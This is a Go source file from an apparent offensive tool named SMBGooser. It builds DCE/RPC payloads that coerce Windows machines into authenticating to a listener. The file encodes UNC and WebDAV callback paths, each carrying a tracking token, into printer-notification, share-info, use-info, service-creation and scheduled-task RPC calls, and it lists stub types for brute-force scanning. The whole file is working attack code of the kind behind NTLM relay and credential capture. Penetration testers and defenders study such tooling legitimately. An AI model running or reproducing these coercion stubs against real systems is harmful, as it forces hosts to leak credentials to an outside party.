package coerce

import (
	"fmt"
	"strings"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
)

// StubType represents the expected parameter layout for a method
type StubType int

const (
	StubEmpty            StubType = iota // No path parameters
	StubSinglePath                       // func(path) - single wchar_t* path
	StubHandlePath                       // func(handle, path) - handle then path
	StubHandleOnly                       // func(handle) - just handle, no path
	StubFlagsPath                        // func(flags, path) - flags then path
	StubTwoPath                          // func(src, dst) - two paths
	StubPrinterPath                      // MS-RPRN printer name format
	StubPrinterNotify                    // MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx
	StubRPCUnicodeString                 // PRPC_UNICODE_STRING format
	StubShareInfo                        // SHARE_INFO structure
	StubUseInfo                          // USE_INFO structure
	StubSCMPath                          // SCM binary path
	StubSCMCreate                        // SCM create service
	StubTaskXML                          // Task Scheduler XML
)

// GenerateCorrelationToken creates a token for a specific interface/opnum
func GenerateCorrelationToken(iface string, opnum uint16) string {
	// Format: <interface_short>_<opnum>_<random>
	ifaceShort := strings.ToLower(iface)
	if len(ifaceShort) > 8 {
		ifaceShort = ifaceShort[:8]
	}
	ifaceShort = strings.TrimPrefix(ifaceShort, "ms-")
	return fmt.Sprintf("%s_%d_%s", ifaceShort, opnum, GenerateToken()[:4])
}

// GenerateStub creates a stub for the given type and listener with correlation token
func GenerateStub(stubType StubType, listener string, token string, useHTTP bool) []byte {
	path := buildPath(listener, token, useHTTP)

	switch stubType {
	case StubEmpty:
		return []byte{}

	case StubSinglePath:
		return encodeNDRPath(path)

	case StubHandlePath:
		// Handle (referent ID) + path
		w := dcerpc.NewNDRWriter()
		w.WritePointer() // Referent ID for handle
		w.WriteUnicodeString(path)
		return w.Bytes()

	case StubHandleOnly:
		w := dcerpc.NewNDRWriter()
		w.WritePointer()
		return w.Bytes()

	case StubFlagsPath:
		// Flags (DWORD) + path
		w := dcerpc.NewNDRWriter()
		w.WriteUint32(0) // Flags
		w.WriteUnicodeString(path)
		return w.Bytes()

	case StubTwoPath:
		// Two paths (src, dst)
		w := dcerpc.NewNDRWriter()
		w.WriteUnicodeString(path)
		w.WriteUnicodeString(path)
		return w.Bytes()

	case StubPrinterPath:
		// Printer name format: \\server\printer
		w := dcerpc.NewNDRWriter()
		w.WriteUnicodeString(path)
		return w.Bytes()

	case StubPrinterNotify:
		// RpcRemoteFindFirstPrinterChangeNotificationEx format
		// hPrinter, fdwFlags, fdwOptions, pszLocalMachine, dwPrinterLocal, pOptions
		w := dcerpc.NewNDRWriter()
		// hPrinter - handle (we use 0)
		w.WritePointer()
		// fdwFlags
		w.WriteUint32(0)
		// fdwOptions
		w.WriteUint32(0)
		// pszLocalMachine - the coercion target
		w.WriteUnicodeString(path)
		// dwPrinterLocal
		w.WriteUint32(0)
		// pOptions - null pointer
		w.WriteUint32(0)
		return w.Bytes()

	case StubRPCUnicodeString:
		// RPC_UNICODE_STRING structure: Length, MaxLength, Buffer pointer
		pathUtf16 := stringToUTF16(path)
		w := dcerpc.NewNDRWriter()
		// Length (in bytes, excluding null)
		w.WriteUint16(uint16(len(pathUtf16)))
		// MaxLength (in bytes, including null)
		w.WriteUint16(uint16(len(pathUtf16) + 2))
		// Pointer to buffer
		w.WritePointer()
		// Conformant string data
		w.WriteUint32(uint32(len(pathUtf16)/2 + 1)) // Max count (chars)
		w.WriteUint32(0)                            // Offset
		w.WriteUint32(uint32(len(pathUtf16) / 2))   // Actual count (chars)
		w.WriteBytes(pathUtf16)
		// Null terminator
		w.WriteUint16(0)
		// Pad to 4-byte boundary
		w.Align(4)
		return w.Bytes()

	case StubShareInfo:
		// SHARE_INFO_502 has a path field
		w := dcerpc.NewNDRWriter()
		// Level
		w.WriteUint32(502)
		// Pointer to info
		w.WritePointer()
		// shi502_netname
		w.WriteUnicodeString("SHARE")
		// shi502_type
		w.WriteUint32(0)
		// shi502_remark
		w.WriteUnicodeString("")
		// shi502_permissions
		w.WriteUint32(0)
		// shi502_max_uses
		w.WriteUint32(0xFFFFFFFF)
		// shi502_current_uses
		w.WriteUint32(0)
		// shi502_path - the coercion target
		w.WriteUnicodeString(path)
		// shi502_passwd
		w.WriteUint32(0) // NULL pointer
		// shi502_reserved
		w.WriteUint32(0)
		// shi502_security_descriptor
		w.WriteUint32(0) // NULL
		return w.Bytes()

	case StubUseInfo:
		// USE_INFO_2 structure
		w := dcerpc.NewNDRWriter()
		// Level
		w.WriteUint32(2)
		// Pointer
		w.WritePointer()
		// ui2_local
		w.WriteUnicodeString("Z:")
		// ui2_remote - the coercion target
		w.WriteUnicodeString(path)
		// ui2_password
		w.WriteUint32(0)
		// ui2_status
		w.WriteUint32(0)
		// ui2_asg_type
		w.WriteUint32(0)
		// ui2_refcount
		w.WriteUint32(0)
		// ui2_usecount
		w.WriteUint32(0)
		// ui2_username
		w.WriteUint32(0)
		// ui2_domainname
		w.WriteUint32(0)
		return w.Bytes()

	case StubSCMPath:
		// Just the binary path
		return encodeNDRPath(path)

	case StubSCMCreate:
		// RCreateServiceW stub - simplified
		w := dcerpc.NewNDRWriter()
		// hSCManager (handle)
		w.WritePointer()
		// lpServiceName
		w.WriteUnicodeString("TestSvc")
		// lpDisplayName
		w.WriteUint32(0) // NULL
		// dwDesiredAccess
		w.WriteUint32(0x000F01FF)
		// dwServiceType
		w.WriteUint32(0x10) // SERVICE_WIN32_OWN_PROCESS
		// dwStartType
		w.WriteUint32(3) // SERVICE_DEMAND_START
		// dwErrorControl
		w.WriteUint32(0) // SERVICE_ERROR_IGNORE
		// lpBinaryPathName - the coercion target
		w.WriteUnicodeString(path)
		// lpLoadOrderGroup
		w.WriteUint32(0) // NULL
		// lpdwTagId
		w.WriteUint32(0) // NULL
		// lpDependencies
		w.WriteUint32(0) // NULL
		// dwDependSize
		w.WriteUint32(0)
		// lpServiceStartName
		w.WriteUint32(0) // NULL
		// lpPassword
		w.WriteUint32(0) // NULL
		// dwPwSize
		w.WriteUint32(0)
		return w.Bytes()

	case StubTaskXML:
		// Task XML with embedded UNC path
		xml := fmt.Sprintf(`<?xml version="1.0"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Actions>
    <Exec>
      <Command>%s\test.exe</Command>
    </Exec>
  </Actions>
</Task>`, path)
		return encodeNDRPath(xml)

	default:
		return encodeNDRPath(path)
	}
}

// buildPath constructs the callback path with token
func buildPath(listener, token string, useHTTP bool) string {
	if useHTTP {
		// HTTP/WebDAV format
		return fmt.Sprintf("http://%s/%s/file.txt", listener, token)
	}
	// UNC format
	return fmt.Sprintf(`\\%s\%s\file.txt`, listener, token)
}

// encodeNDRPath encodes a path as NDR conformant/varying string
func encodeNDRPath(path string) []byte {
	w := dcerpc.NewNDRWriter()
	w.WriteUnicodeString(path)
	return w.Bytes()
}

// stringToUTF16 converts a string to UTF-16LE bytes
func stringToUTF16(s string) []byte {
	result := make([]byte, len(s)*2)
	for i, r := range s {
		result[i*2] = byte(r)
		result[i*2+1] = byte(r >> 8)
	}
	return result
}

// GetStubTypeName returns a human-readable name for a stub type
func GetStubTypeName(st StubType) string {
	names := map[StubType]string{
		StubEmpty:            "empty",
		StubSinglePath:       "single_path",
		StubHandlePath:       "handle_path",
		StubHandleOnly:       "handle_only",
		StubFlagsPath:        "flags_path",
		StubTwoPath:          "two_path",
		StubPrinterPath:      "printer_path",
		StubPrinterNotify:    "printer_notify",
		StubRPCUnicodeString: "rpc_unicode",
		StubShareInfo:        "share_info",
		StubUseInfo:          "use_info",
		StubSCMPath:          "scm_path",
		StubSCMCreate:        "scm_create",
		StubTaskXML:          "task_xml",
	}
	if name, ok := names[st]; ok {
		return name
	}
	return "unknown"
}

// AllStubTypes returns all stub types that contain paths for brute-force scanning
func AllStubTypes() []StubType {
	return []StubType{
		StubSinglePath,
		StubHandlePath,
		StubFlagsPath,
		StubTwoPath,
		StubPrinterPath,
		StubPrinterNotify,
		StubRPCUnicodeString,
	}
}
